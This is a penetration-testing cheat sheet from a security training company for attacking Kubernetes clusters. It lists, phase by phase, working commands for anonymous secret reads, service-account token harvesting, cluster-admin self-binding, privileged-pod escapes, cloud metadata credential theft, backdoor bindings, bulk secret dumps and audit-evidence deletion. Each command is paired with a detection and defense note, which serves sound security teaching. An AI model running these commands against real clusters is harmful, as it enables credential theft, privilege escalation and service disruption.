# Kubernetes Cloud Attack Cheat Sheet

A phase-by-phase offensive security reference for Kubernetes, with a real command for every technique. Maintained by [Pwned Labs](https://pwnedlabs.io), which teaches these attacks and their defenses hands-on in live Kubernetes environments through Academy labs and the Kubernetes Attack and Defense bootcamp (KRTP).

The full interactive version, with one-click copy for every command, is at **[https://pwnedlabs.io/resources/kubernetes-attack-cheat-sheet](https://pwnedlabs.io/resources/kubernetes-attack-cheat-sheet)**.

---

## How to use this cheat sheet

A Kubernetes attack cheat sheet is a reference table of the commands attackers and penetration testers run against a cluster at each stage of an assessment, from enumerating the API server through to privilege escalation and lateral movement into cloud identities. Pwned Labs built this cheat sheet from the commands taught in the [Kubernetes Red Team Professional bootcamp](https://pwnedlabs.io/bootcamps/krtp-bootcamp), which certifies the skill with the KRTP exam, so every row is something we have run against a real cluster, not a theoretical example.

Work down the tables in order on a black-box engagement: recon tells you what is reachable before you touch anything. When an engagement starts with a provided credential (a kubeconfig, a service account token, or CI access), the first move is the same, aimed at the credential you already hold rather than at finding one. Replace `<cluster-ip>`, `<namespace>`, `<pod>`, `<token>` and similar placeholders with real values. Commands that change cluster state (creating pods, tokens or RoleBindings) are for authorized testing inside an agreed scope only.

## Reconnaissance and enumeration

Recon is the first step, whether or not we already hold a credential. The goal is to learn what the current identity resolves to, what it can do, and what is reachable, before touching any resource.

| Technique | Command | What it gives you | Detection and defense |
| --- | --- | --- | --- |
| Identify your own identity and token claims | `kubectl auth whoami` | The exact username and groups the API server resolves your credential to, before you touch any resource | Audit logging captures SelfSubjectReview calls; alert on repeated identity checks from unfamiliar source IPs |
| Decode a service account JWT offline (does not verify the signature) | `printf '%s' "$TOKEN" \| cut -d. -f2 \| base64 -d 2>/dev/null \| jq '{iss,sub,aud,exp}'` | Namespace, service account name, audience and whether the token has an expiry at all (legacy tokens have none) | Rotate legacy non-expiring Secret-bound tokens to bound, time-limited tokens via TokenRequest |
| Enumerate every namespace you can see | `kubectl get ns` | A map of the cluster's blast radius: which teams and namespaces hold payment or secrets data | Namespace-scoped RBAC should stop a low-privilege identity listing all namespaces cluster-wide |
| Sweep every verb and resource for yourself | `kubectl auth can-i --list -n <namespace>` | The full rule set for your current identity in one namespace, including resource-name-restricted grants | SelfSubjectRulesReview calls are logged; a legitimate audit identity should only request read verbs |
| Check a specific permission without performing it | `kubectl auth can-i get secrets -n <namespace>` | A yes/no authorization review with no side effect, useful for scripting a permission sweep across namespaces | Treat a wide "yes" sweep across namespaces from one identity as worth investigating |
| Find ClusterRoles with dangerous escalation verbs | `kubectl get clusterroles -o json \| jq -r '.items[] \| select(any(.rules[]?; (.verbs//[])\|index("bind") or index("escalate"))) \| .metadata.name'` | Roles that can grant bind or escalate rights, a precondition (not a guarantee) for RBAC privilege escalation | Restrict bind and escalate verbs to a small, monitored set of platform-admin ClusterRoles |
| Scan a cluster for known weaknesses (remote, no credential needed) | `kube-hunter --remote <cluster-ip>` | An attacker's-eye view of exposed ports, APIs and misconfigurations across the estate ([kube-hunter](https://github.com/aquasecurity/kube-hunter)) | Network-segment the API server, kubelet and dashboard away from the public internet; monitor for probe signatures |

## Initial access: exposed API server, kubelet, dashboard, etcd

Many clusters hand over data before any identity is established, through an endpoint that was never meant to be reachable: an anonymous API binding, a legacy kubelet port, a standalone etcd, or a public dashboard.

| Technique | Command | What it gives you | Detection and defense |
| --- | --- | --- | --- |
| Anonymous API access where system:anonymous is bound to a role | `curl -skS "https://<api-host>:6443/api/v1/namespaces/<namespace>/secrets"` | Secret objects in any namespace where someone bound unauthenticated identities to a reader role | Audit RoleBindings for system:anonymous and system:unauthenticated subjects; set --anonymous-auth=false unless required |
| Probe the kubelet's legacy unauthenticated read-only port | `curl -sS --max-time 10 "http://<node-ip>:10255/pods"` | Full pod specifications for every pod on that node, including literal (non-Secret-ref) environment variable values | Disable the read-only port (off by default in modern kubelet configs); confirm :10255 refuses connections from outside |
| Extract leaked literal env values from the kubelet /pods response | `curl -sS "http://<node-ip>:10255/pods" \| jq -r '.items[] \| .spec.containers[] \| .env[]? \| select(has("value")) \| "\(.name)=\(.value)"'` | Secrets hard-coded as literal pod env values instead of secretKeyRef, now readable with no auth at all | Never inject secrets as literal env values; use secretKeyRef or envFrom and restrict who can read Pod specs |
| Run the kubelet client API surface across a range | `kubeletctl scan rce --cidr <cidr>` | A scan for kubelet nodes that permit command execution through their API ([kubeletctl](https://github.com/cyberark/kubeletctl)) | Require --authentication-token-webhook and --authorization-mode=Webhook on every kubelet; never AlwaysAllow |
| Read directly from an exposed, unauthenticated etcd NodePort | `etcdctl --endpoints="http://<node-ip>:32379" get /registry --prefix --keys-only` | The full keyspace of a reachable etcd instance, bypassing Kubernetes RBAC entirely | Never expose etcd on a NodePort or public interface; require client TLS and encryption at rest for Secrets |
| Hunt and score CIS Benchmark gaps that enable the above | `kube-bench run --targets master,node,etcd` | A structured list of failed CIS Kubernetes Benchmark checks across control plane and nodes ([kube-bench](https://github.com/aquasecurity/kube-bench)) | Run kube-bench on a schedule in CI/CD and alert on regression against the baseline |

## Credential access: service account tokens and secrets

Once you can reach the API or a node, the next step is to collect tokens and secrets: reading Secret objects, requesting fresh bound tokens, impersonating other identities, or pulling tokens the kubelet already mounted into running pods.

| Technique | Command | What it gives you | Detection and defense |
| --- | --- | --- | --- |
| Read a Secret's value (API representation, not encryption) | `kubectl -n <namespace> get secret <secret> -o jsonpath='{.data.flag}' \| base64 -d` | The plaintext value once decoded; this is how the API represents any Secret, not a vulnerability by itself | Encrypt Secrets at rest (EncryptionConfiguration); restrict get and list on secrets to the minimum RBAC needed |
| List which namespaces your identity can read Secrets in | `for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do kubectl auth can-i get secrets -n "$ns" \| grep -q yes && echo "$ns"; done` | Every unintended Secret-read grant against an identity that is supposed to be read-only | Compare live grants against the built-in view ClusterRole baseline; alert on any extra Secret-read RoleBinding |
| Request a fresh bound token for another ServiceAccount (TokenRequest) | `kubectl -n <namespace> create token <serviceaccount> --audience <audience>` | A short-lived credential for a more powerful ServiceAccount, if you hold create on serviceaccounts/token | Restrict create on serviceaccounts/token tightly; audit every TokenRequest and alert on cross-namespace requests |
| Act as another identity via impersonation instead of a new token | `kubectl --as=system:serviceaccount:<namespace>:<sa> -n <target-ns> get secret <secret> -o jsonpath='{.data.flag}'` | The target identity's effective permissions for this request only, if you hold impersonate on that subject | Restrict the impersonate verb to break-glass admins; audit logs capture both the real and impersonated user |
| Read a mounted Secret from disk inside a pod, bypassing Secrets RBAC | `kubectl exec <pod> -n <namespace> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token` | The token the kubelet already mounted for that pod, readable by anyone who can exec in regardless of Secrets RBAC | Restrict create on pods/exec; set automountServiceAccountToken: false on workloads that do not need the API |
| Harvest service account tokens across every pod a kubelet knows about | `kubeletctl exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" --server <node-ip> --all-pods` | Tokens from every container the kubelet will execute inside, in one sweep, if its exec endpoint is permissive | Restrict kubelet authorization to Node and RBAC modes only; never run AlwaysAllow |
| Collect credential material from a compromised pod or node with an all-in-one tool | `peirates` | An automated sweep of tokens, Secrets and exec access across every reachable namespace ([peirates](https://github.com/inguardians/peirates)) | Treat any pentest binary inside a production pod as a compromise indicator; restrict egress so tools cannot be pulled in |

## Privilege escalation: RBAC abuse, privileged pods, hostPath

Escalation in Kubernetes usually comes from one of three places: an RBAC grant that lets you widen your own rights, a pod spec permissive enough to reach the node, or a node identity that doubles as a cloud credential.

| Technique | Command | What it gives you | Detection and defense |
| --- | --- | --- | --- |
| Bind yourself to cluster-admin using a bind grant | `kubectl create clusterrolebinding escalate-me --clusterrole=cluster-admin --user=<user>` | Full cluster-admin rights, if you hold bind on that role and create on ClusterRoleBindings | Restrict bind, escalate and ClusterRoleBinding create to a small, alerted set of platform-admin identities |
| Enumerate container capabilities and process-namespace sharing | `grep '^CapEff:' /proc/self/status; ps aux` | Confirmation of CAP_SYS_PTRACE and visibility into sibling containers under shareProcessNamespace: true | Never set shareProcessNamespace: true on pods that mix trust levels; drop all capabilities by default |
| Read a sibling container's filesystem through /proc | `ls -la "/proc/$NPID/root/etc/kubernetes/"` | Access to any file the procfs check and file permissions allow, including credentials on a neighbouring container | Isolate sensitive workloads into their own pods; apply a restricted Pod Security Standard |
| Create a hostPath pod to read or write the node filesystem | `kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpath/pod/hostpath-exec-pod.yaml` | A pod with the node's filesystem (kubelet credentials, runtime sockets) mounted inside it ([badPods](https://github.com/BishopFox/badPods)) | Enforce Pod Security restricted (or OPA/Kyverno) to reject hostPath volumes outside allow-listed system namespaces |
| Create a privileged pod to escape to the node | `kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/pod/priv-exec-pod.yaml` | A container running with privileged: true, from which a classic container escape to the host is possible | Block privileged and allowPrivilegeEscalation with admission control; audit who can create workloads cluster-wide |
| Scan a cluster for over-privileged roles and risky subjects | `kubiscan -rs` | A ranked list of risky Roles, RoleBindings and pods based on known escalation patterns ([KubiScan](https://github.com/cyberark/KubiScan)) | Run KubiScan against production periodically and track drift from the last known-good RBAC baseline |
| Read the node IAM role from inside a pod (cloud escalation) | `TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/` | The node's AWS IAM role credentials, which on EKS also authenticate to the API as system:node: | Set the IMDS hop limit to 1 on worker nodes so pods cannot reach it; prefer IRSA/Pod Identity over node-role reliance |

## Lateral movement: pod-to-pod, pod-to-node, cloud metadata

Namespaces scope the API, not the network, and a node can act for every workload scheduled on it. Lateral movement exploits both: reaching services across namespaces, and turning a node or workload identity into cloud credentials.

| Technique | Command | What it gives you | Detection and defense |
| --- | --- | --- | --- |
| Reach another namespace's Service with no credential | `wget -qO- http://<service>.<namespace>.svc.cluster.local:8080/` | Confirmation that network reachability crosses namespace boundaries, since namespaces scope the API, not the network | Deploy default-deny NetworkPolicy per namespace and allow only required east-west paths |
| Steal the node AWS identity and pivot via the node authorizer | `kubectl get pods -A --field-selector spec.nodeName=<node> -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}{"\n"}{end}'` | Read access to any Secret referenced by a pod on that node, because the Node authorizer permits it to read its own pods' Secrets | Set IMDS hop limit to 1; keep node roles no broader than system:nodes requires |
| Assume an IRSA/Workload Identity role with a too-broad trust policy | `aws sts assume-role-with-web-identity --role-arn <role-arn> --role-session-name probe --web-identity-token "$(kubectl create token default -n <namespace> --audience sts.amazonaws.com)"` | Credentials for any cloud role whose OIDC trust condition uses a wildcard subject instead of an exact match | Pin every trust policy to StringEquals on the exact namespace:serviceaccount subject and the correct audience |
| Walk an assume-role graph toward an admin-shaped role | `aws iam get-role-policy --role-name <role> --policy-name <policy> --query 'PolicyDocument.Statement[].{Action:Action,Resource:Resource}'` | The next hop in a chain of roles that trust each other, read from each role inline policy | Alert on any role assuming a strictly more privileged role with no business justification; review chains in IAM access reviews |

## Persistence

Persistence keeps access after the initial foothold is cleaned up: a non-expiring token, a standing RoleBinding, a self-rescheduling workload, or a webhook that tampers with future requests.

| Technique | Command | What it gives you | Detection and defense |
| --- | --- | --- | --- |
| Create a long-lived, non-expiring Secret-backed token | `kubectl apply -f secret-sa-token.yaml # type: kubernetes.io/service-account-token` | A credential for a ServiceAccount that does not expire on its own, unlike the bound tokens TokenRequest issues | Alert on new Secrets of type kubernetes.io/service-account-token; prefer bound, short-lived tokens everywhere |
| Add a standing, over-broad RoleBinding as a backdoor | `kubectl create rolebinding backdoor --clusterrole=edit --serviceaccount=<namespace>:<sa> -n <namespace>` | A durable grant that survives a single-session compromise and blends in with legitimate CI bindings | Diff RBAC against a GitOps-managed baseline on every reconcile; alert on bindings created outside the pipeline |
| Deploy a DaemonSet for persistence on every node | `kubectl apply -f <daemonset-manifest>` | A workload that reschedules itself on every current and future node, surviving individual pod deletion | Restrict create on daemonsets to platform namespaces; alert on DaemonSet creation outside CI |
| Plant a mutating admission webhook to tamper with future requests | `kubectl apply -f <mutatingwebhookconfiguration.yaml>` | The ability to silently mutate or block future API requests cluster-wide, such as injecting a sidecar into every new pod | Restrict create and update on webhook configurations tightly; alert on any change to them |
| Leave a CronJob behind that re-establishes access | `kubectl create cronjob persist --image=<image> --schedule="*/30 * * * *" -- /bin/sh -c '<reconnect>'` | A scheduled task that keeps re-establishing a foothold even after the initial pod is killed | Review CronJobs for suspended-but-privileged edges; alert on CronJob creation outside CI |

## Impact: exfiltration and disruption

The final stage turns access into effect: bulk Secret theft, denial of service, resource abuse, or tampering with the evidence that would otherwise expose the rest of the chain.

| Technique | Command | What it gives you | Detection and defense |
| --- | --- | --- | --- |
| Exfiltrate Secrets at scale across every reachable namespace | `for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do kubectl -n "$ns" get secrets -o json; done` | A bulk dump of every Secret your identity can read, the end state of a credential-access chain | Encrypt Secrets at rest; alert on abnormal volumes of get secrets calls per identity per time window |
| Delete workloads or namespaces to cause denial of service | `kubectl delete namespace <namespace>` | Service disruption or data loss if backing PersistentVolumeClaims are reclaimed with the namespace | Require bulk-delete actions to go through a change-managed pipeline; enable PVC retention policies |
| Scale a workload to zero to silently take it offline | `kubectl scale deployment <deployment> --replicas=0 -n <namespace>` | A quiet, hard-to-notice outage that looks like routine operations in a casual audit log review | Alert on scale-to-zero events for production deployments outside a maintenance window |
| Tamper with or delete audit evidence | `kubectl delete pod <audit-pod> -n kube-system` | Reduced visibility into the rest of the attack chain, complicating incident response | Ship audit logs to an external, write-once store the cluster identity cannot reach; alert on audit-policy changes |

## Detection and defense

The same tools that map an attack make good auditors when you run them against your own cluster. The pattern that holds up best is CIS hardening first, then least-privilege RBAC, then default-deny networking and write-once audit logging on top.

| Tool or control | Command | What it checks |
| --- | --- | --- |
| [kube-bench](https://github.com/aquasecurity/kube-bench) (CIS Kubernetes Benchmark) | `kube-bench run --targets master,node,etcd` | Control-plane, node and etcd config against the CIS Benchmark: anonymous auth, missing TLS, weak kubelet authorization |
| [kube-hunter](https://github.com/aquasecurity/kube-hunter) | `kube-hunter --remote <cluster-ip> --active` | Simulated attacker reconnaissance and optional active exploitation against a cluster's exposed surface |
| [KubiScan](https://github.com/cyberark/KubiScan) | `kubiscan -rs` | Risky Roles, ClusterRoles, RoleBindings, subjects and pods based on known RBAC escalation patterns |
| [Stratus Red Team](https://github.com/DataDog/stratus-red-team) | `stratus detonate <technique-id>` | Self-contained detonation of a documented Kubernetes or cloud technique, mapped to MITRE ATT&CK, to validate detections |
| kubectl auth can-i (built-in) | `kubectl auth can-i --list -n <namespace>` | The complete rule set for the current identity, the fastest sanity check before trusting any RBAC assumption |
| Kubernetes audit logging | `# cluster config: --audit-policy-file=<file>` | Every API request, the primary evidence source for detecting TokenRequest, impersonation and escalation calls |
| NetworkPolicy (Calico, Cilium, CNI-native) | `kubectl apply -f <default-deny-networkpolicy.yaml>` | Default-deny east-west traffic so lateral movement between namespaces needs an explicit allow rule |

## Practice this at Pwned Labs

The fastest way from this cheat sheet to real skill is the **[Kubernetes Red Team Professional bootcamp](https://pwnedlabs.io/bootcamps/krtp-bootcamp)**, which runs every phase above against live clusters, plus EKS, GKE and AKS, and certifies the skill with the KRTP exam. The free labs below are the way in.

Reading a command is not the same as running it against a cluster and watching what comes back. The [Kubernetes Red Team Professional bootcamp](https://pwnedlabs.io/bootcamps/krtp-bootcamp) walks through this exact progression, exposed kubelet ports, anonymous API grants, standalone etcd, RBAC token issuance and impersonation, shared-process-namespace abuse and multi-hop credential replay, against a purpose-built cluster with an objective flag for each lab. The cloud sessions extend the same identities into EKS, GKE and AKS: IRSA and Workload Identity trust chains, node-to-controller token theft, and the IAM bridges between a leaked key and cluster access, assessed hands-on toward the KRTP certification. Free Kubernetes labs are at [pwnedlabs.io/explore](https://pwnedlabs.io/explore).

## Frequently asked questions

### What is a Kubernetes attack cheat sheet?

A Kubernetes attack cheat sheet is a reference list of the commands used to enumerate, access, escalate privilege within, and move laterally through a Kubernetes cluster during a security assessment. A useful one, like this page, lists the exact kubectl, kubelet-client and cloud-CLI commands rather than describing techniques in the abstract.

### Do I need cluster-admin access to start testing a Kubernetes cluster?

No. Many real findings start from zero credentials: an exposed kubelet read-only port, an anonymous API grant, or a reachable etcd NodePort can all hand over cluster data before any identity is established. Where an engagement does start with a provided credential, the first move is the same kubectl auth whoami and auth can-i --list sweep, aimed at the credential you already hold.

### What is the most common Kubernetes misconfiguration attackers exploit?

RBAC over-grants are the recurring pattern: a Role or ClusterRoleBinding that grants more than its intended baseline, commonly Secret read on a role meant to be read-only, or bind and escalate verbs left on a role nobody expected to be security-sensitive. Comparing live bindings against the built-in view, edit and admin ClusterRoles is the fastest way to surface the gap.

### Can a compromised pod reach my cloud provider credentials?

It depends on configuration. On a managed cluster like EKS a pod can often reach the node cloud role through the instance metadata service unless the hop limit is set to 1, and workload identities (IRSA, GKE Workload Identity, AKS Workload Identity Federation) can be over-trusted through wildcard OIDC trust conditions. Both paths are shown with real commands in the lateral movement section.

### Is kubectl auth can-i --list a complete picture of my permissions?

Not always. On managed clusters where authorization also depends on a cloud IAM layer, for example GKE where some permissions come from Google Cloud IAM rather than Kubernetes RBAC, kubectl auth can-i --list only shows the Kubernetes-RBAC side. Test the specific verb and resource directly with kubectl auth can-i rather than trusting the list alone.

### What is the fastest first step to harden a cluster against this cheat sheet?

Run kube-bench against the CIS Kubernetes Benchmark and fix the failures for anonymous authentication, kubelet authorization mode and API server flags first, since those give an attacker a foothold with no credential at all. Then move to an RBAC audit with a tool like KubiScan to find over-granted roles before they become the next pivot.

### Where can I practice Kubernetes security safely?

Pwned Labs runs Kubernetes attack and defense labs in live, isolated clusters, from free beginner labs through to the Kubernetes Red Team Professional bootcamp that leads to the KRTP certification. Nothing here should be run against systems you do not own or have written permission to test.

**About Pwned Labs**

Pwned Labs is a hands-on cloud and AI offensive security training platform. It runs real-world attack labs and bootcamps for AWS, Azure, GCP, Kubernetes and AI systems, including the ACRTP, MCRTP, GCRTP, KRTP and AISRTP certifications. Free labs are at [pwnedlabs.io/explore](https://pwnedlabs.io/explore).

---

## License

Published by Pwned Labs under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Share and adapt with attribution to Pwned Labs (https://pwnedlabs.io).
